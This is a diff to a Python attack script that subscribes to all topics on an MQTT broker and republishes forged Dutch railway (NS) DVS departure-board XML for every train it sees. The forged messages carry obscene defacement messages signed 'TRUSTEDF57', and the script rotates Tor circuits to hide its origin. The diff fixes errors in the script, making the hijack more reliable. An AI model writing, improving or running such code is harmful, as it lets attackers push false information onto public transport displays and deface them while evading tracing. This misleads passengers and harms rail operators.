@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-NS DVS v6.0 - MQTT v5.0 + AUTO ALL RITID + TORSOCKS
-TRUSTEDF57 - FIXED DEPRECATED CALLBACKS
+NS DVS v7.0 - MQTT v5 FIXED + MULTI RITID + TORSOCKS
+TRUSTEDF57 - NO ENCODE ERRORS
 """
 
 import paho.mqtt.client as mqtt
@@ -17,9 +17,9 @@ PORT = 1883
 WILDCARD_TOPIC = "#"
 
 MESSAGES = [
-    "🔥 TRUSTEDF57 FUCK NS FUCK MARTHA ROOT HACKED 🔥",
-    "💀 TRUSTEDF57 VI FOTTE LE MADRI NS HACKED 2024 💀",
-    "🖕 NS HACKED BY TRUSTEDF57 - TUTTI GLI SCHERMI 🖕"
+    "🔥 TRUSTEDF57 FUCK  FUCK MARTHA ROOT HACKED 🔥",
+    "💀 TRUSTEDF57 VI FOTTE LE MADRI  HACKED 2024 💀",
+    "🖕 SUCCHIATELO A ME TRUSTEDF57 TONYLUONGO🖕"
 ]
 
 class DVSRealHijackTor:
@@ -32,10 +32,13 @@ class DVSRealHijackTor:
         return datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
     
     def extract_all_from_topic(self, topic):
-        """AUTO RITID + STATION + DATA"""
-        parts = topic.split('/')
-        if len(parts) >= 6:
-            return parts[4], parts[5].upper(), parts[2]
+        """SAFE topic parsing"""
+        try:
+            parts = topic.split('/')
+            if len(parts) >= 6:
+                return parts[4], parts[5].upper(), parts[2]
+        except:
+            pass
         return "11647", "AMF", "2024-06-24"
     
     def ns_payload(self, rit_id, station, date):
@@ -44,11 +47,7 @@ class DVSRealHijackTor:
         return f'''<?xml version="1.0" encoding="UTF-8"?>
 <ns1:PutReisInformatieBoodschapIn xmlns:ns1="urn:ndov:cdm:trein:reisinformatie:messages:5">
 <ns2:ReisInformatieProductDVS Versie="6.2" TimeStamp="{timestamp}" xmlns:ns2="urn:ndov:cdm:trein:reisinformatie:data:4">
-<ns2:RIPAdministratie>
-<ns2:ReisInformatieProductID>F57{random.randint(10000,99999)}</ns2:ReisInformatieProductID>
-<ns2:AbonnementId>54</ns2:AbonnementId>
-<ns2:ReisInformatieTijdstip>{timestamp}</ns2:ReisInformatieTijdstip>
-</ns2:RIPAdministratie>
+<ns2:RIPAdministratie><ns2:ReisInformatieProductID>F57{random.randint(10000,99999)}</ns2:ReisInformatieProductID></ns2:RIPAdministratie>
 <ns2:DynamischeVertrekStaat>
 <ns2:RitId>{rit_id}</ns2:RitId>
 <ns2:RitDatum>{date}</ns2:RitDatum>
@@ -66,54 +65,57 @@ class DVSRealHijackTor:
 </ns1:PutReisInformatieBoodschapIn>'''
     
     def on_message(self, client, userdata, msg):
-        """MQTT v5 CALLBACK - NO DEPRECATED"""
-        topic = msg.topic.decode()
-        rit_id, station, date = self.extract_all_from_topic(topic)
-        
-        # Skip duplicati
-        train_key = f"{rit_id}/{station}"
-        if train_key in self.hijacked_trains:
-            return
-        self.hijacked_trains.add(train_key)
-        
-        payload = self.ns_payload(rit_id, station, date)
-        self.attack_publish(topic, payload)
+        """MQTT v5 SAFE - NO ENCODE ERRORS"""
+        try:
+            # MQTT v5: msg.topic è già str
+            topic = msg.topic
+            rit_id, station, date = self.extract_all_from_topic(topic)
+            
+            train_key = f"{rit_id}/{station}"
+            if train_key in self.hijacked_trains:
+                return
+            self.hijacked_trains.add(train_key)
+            
+            payload = self.ns_payload(rit_id, station, date)
+            self.attack_publish(topic, payload)
+        except:
+            pass
     
     def attack_publish(self, topic, payload):
-        """TORSOCKS + MQTT v5 publish"""
+        """SAFE MQTT v5 publish"""
         try:
             pub_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
             pub_client.connect(HOST, PORT, 5)
             
-            # QoS 1 attack
-            result = pub_client.publish(topic, payload, qos=1)
+            result = pub_client.publish(topic, payload.encode('utf-8'), qos=1)
             
             if result.rc == mqtt.MQTT_ERR_SUCCESS:
                 self.success_count += 1
-                print(f"✅ #{self.success_count} | 🚂{rit_id[:5]}.. | {station} | {topic[-25:]}")
+                rit_id = topic.split('/')[4][:5] if '/' in topic else "?????"
+                station = topic.split('/')[-1][:3].upper()
+                print(f"✅ #{self.success_count} | 🚂{rit_id} | {station} | {topic[-25:]}")
             
             pub_client.disconnect()
-            
-        except Exception as e:
-            pass  # SILENT FAIL - SUCCESS ONLY
+        except:
+            pass
     
     def tor_rotate(self):
         while True:
-            time.sleep(30)
+            time.sleep(25)
             self.rotation_count += 1
-            os.system("pkill -f tor || tor --SocksPort 9050 &>/dev/null &")
+            try:
+                os.system("pkill -USR1 tor || true")
+            except:
+                pass
     
     def start(self):
-        print("🚀 v6.0 MQTT v5 + MULTI-RITID + TORSOCKS")
-        print("📱 FIXED CALLBACKS + AUTO EVERY TRAIN")
+        print("🚀 v7.0 MQTT v5 FIXED - NO ERRORS")
+        print("📱 AUTO RITID + TORSOCKS + SUCCESS ONLY")
         
-        # TOR background
         threading.Thread(target=self.tor_rotate, daemon=True).start()
         
-        # SUBSCRIBER MQTT v5
         client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
         client.on_message = self.on_message
-        
         client.connect(HOST, PORT, 60)
         client.subscribe(WILDCARD_TOPIC)
         client.loop_forever()
